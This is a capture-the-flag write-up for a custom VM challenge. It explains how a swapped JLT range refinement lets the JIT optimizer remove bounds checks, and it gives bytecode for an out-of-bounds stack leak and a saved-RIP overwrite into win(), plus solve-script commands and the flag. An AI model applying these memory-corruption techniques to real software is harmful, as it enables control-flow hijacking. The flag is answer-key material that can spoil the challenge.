# Solaris JIT Solution

## Overview

The challenge runs a custom virtual machine with a JIT-style range-analysis optimizer.
The optimizer tracks register value bounds `[min, max]` and eliminates runtime bounds
checks on `LOAD`/`STORE` instructions when it can statically prove the index is safe.

The bug is in the `JLT` (jump-if-less-than) conditional branch range refinement logic.

## Vulnerability: Swapped Range Refinement

For `JLT r0, r1, target` where `r1` is a constant `K`:

| Path | Correct refinement | Buggy implementation |
|---|---|---|
| Taken (`r0 < K`) | `r0.max = K - 1` | `r0.min = K` ❌ |
| Fallthrough (`r0 >= K`) | `r0.min = K` | `r0.max = K - 1` ❌ |

The taken and fallthrough refinements are swapped. On the fallthrough path (where
`r0 >= K` at runtime), the optimizer incorrectly believes `r0.max = K - 1`, so it
thinks `r0` is within bounds and removes the array bounds check.

## Exploitation

### Step 1: OOB Read (Stack Leak)

Send bytecode that inputs an index `V >= 256`, branches on `JLT r0, 256, HALT`,
and on the fallthrough does `LOAD r2, r0`. The optimizer removes the bounds check,
so we can read `data_mem[V]` which is past the 256-element array and into the stack.

```
LI   r1, 256
INPUT r0          ; read V (e.g. 269)
JLT  r0, r1, 4   ; buggy fallthrough refines r0.max = 255
LOAD r2, r0       ; OOB read! bounds check eliminated
HALT              ; prints r2 = leaked stack value
```

Scan indices 256–280 to find one containing a code pointer in the `0x400000` range
(`-no-pie` binary). This is the saved return address of `run_vm` back into `main`.

### Step 2: OOB Write (RIP Hijack)

Once the saved RIP index is known, send bytecode with two `INPUT`/`JLT`/`STORE` 
sequences to write:
- `data_mem[rip_index]` = address of a `ret` gadget (for 16-byte stack alignment)
- `data_mem[rip_index + 1]` = address of `win()`

```
LI    r1, 256
INPUT r0              ; rip_index
LI    r2, <ret_gadget>
JLT   r0, r1, 5      ; bypass bounds check
STORE r0, r2          ; overwrite saved RIP with ret

INPUT r0              ; rip_index + 1
LI    r4, <win_addr>
JLT   r0, r1, 9      ; bypass bounds check
STORE r0, r4          ; write win address above ret
HALT
```

When `run_vm` returns, it executes `ret → ret → win()` with proper stack alignment.
`win()` reads `flag.txt` and prints the flag.

### Why two writes?

On x86-64, calling conventions require 16-byte stack alignment before `call`.
When `run_vm` executes `ret`, `rsp` is 16-byte aligned. If we jump straight to
`win()`, its prologue (`push rbp`) misaligns the stack, and library calls like
`fopen` crash on SSE instructions. Adding a `ret` gadget first pops one extra
8 bytes, fixing the alignment.

## Running the Exploit

```bash
# Build
cd src && make

# Local
python3 sol/solve.py

# Remote
python3 sol/solve.py pwn.asrctf.online 21309
```

## Flag

`ASRCTF{r4ng3_r3f1n3m3nt_g0n3_wr0ng_0rb1t4l_br34k0ut}`
